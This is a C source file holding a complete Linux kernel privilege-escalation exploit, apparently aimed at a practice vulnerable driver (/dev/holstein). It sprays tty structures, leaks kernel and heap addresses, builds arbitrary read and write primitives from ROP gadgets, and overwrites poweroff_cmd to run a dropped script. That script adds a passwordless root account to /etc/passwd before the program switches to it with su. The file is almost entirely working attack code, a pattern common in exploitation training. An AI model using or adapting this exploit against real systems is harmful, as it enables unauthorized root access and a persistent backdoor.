#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


#define ulong unsigned long
#define scu static const unsigned long
//#define NULL (void*)0
#define offset_tty_ops 0xc38880
#define rop_mov_eax_prdx (kbase + 0x18a285)
#define rop_mov_prdx_rcx (kbase + 0x0477f7)
#define poweroff_cmd (kbase + 0xe379c0)
#define orderly_poweroff (kbase + 0x750e0)

int spray[100];
int fd;
int cache_fd = -1;
char buf[0x500];
ulong kbase;
ulong g_buf;
ulong user_cs,user_ss,user_sp,user_rflags;

void fatal(char msg[]) {
  printf("[!] Err: %s\n", msg);
  exit(-1);
}

// primitive Any Address Read (32bit)
unsigned int AAR32(unsigned long addr) {
  if (cache_fd == -1) {
    ulong *p = (ulong*)&buf;
    p[12] = rop_mov_eax_prdx;
    *(ulong*)&buf[0x418] = g_buf;
    write(fd, buf, 0x420);
  }
  // mov eax, [rdx]; ret;
  if (cache_fd == -1) {
    for (int i=0; i < 100; i++) {
      int v = ioctl(spray[i], 0, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
        return v;
      }
    }
  } else {
    return ioctl(cache_fd, 0, addr /* rdx */);
  }
}

// primitive Any Address Write (32bit)
void AAW32(ulong addr, unsigned int val) {
  ulong *p = (ulong*)&buf;
  p[12] = rop_mov_prdx_rcx;
  *(unsigned long*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);
  // mov [rdx], rcx; ret;
  for (int i=0; i < 100; i++) {
    ioctl(spray[i], val /* rcx */, addr /* rdx */);
  }
}

int main() {
  // heap spray
  for (int i=0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  fd = open("/dev/holstein", O_RDWR);
  if(fd == -1)
    fatal("/dev/holstein");

  for (int i=50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // kernel address leak
  read(fd, buf, 0x500);
  ulong leak = *(ulong*)&buf[0x418];
  printf("[i] tty_struct ops leak: 0x%016lx\n", leak);
  kbase = leak - offset_tty_ops;
  printf("[i] kernel base: 0x%016lx\n", kbase);
  // kernel heap address leak
  g_buf = *(ulong*)&buf[0x438] - 0x438;
  printf("[i] g_buf: 0x%016lx\n", g_buf);
  // overwrite poweroff_cmd
  puts("[+] making evil script");
  system("echo -e '#!/bin/sh\necho \"pwn::0:0:root:/root:/bin/sh\" >> /etc/passwd' > /tmp/evil.sh");
  system("chmod +x /tmp/evil.sh");
  printf("[i] poweroff_cmd: 0x%016lx\n", poweroff_cmd);
  char cmd[] = "/tmp/evil.sh";
  puts("[+] overwrite poweroff_cmd");
  for (int i = 0; i < sizeof(cmd); i += 4) {
    AAW32(poweroff_cmd + i, *(unsigned int*)&cmd[i]);
  }
  // return to orderly_poweroff
  printf("[i] orderly_poweroff: 0x%016lx\n", orderly_poweroff);
  ulong *p = (ulong*)&buf;
  p[12] = orderly_poweroff;
  *(ulong*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);
  for (int i=0; i < 100; i++) {
    ioctl(spray[i], 0xdeadbeef, NULL);
  }
  puts("[+] spawn root shell...");
  system("su pwn");

  return 0;
}
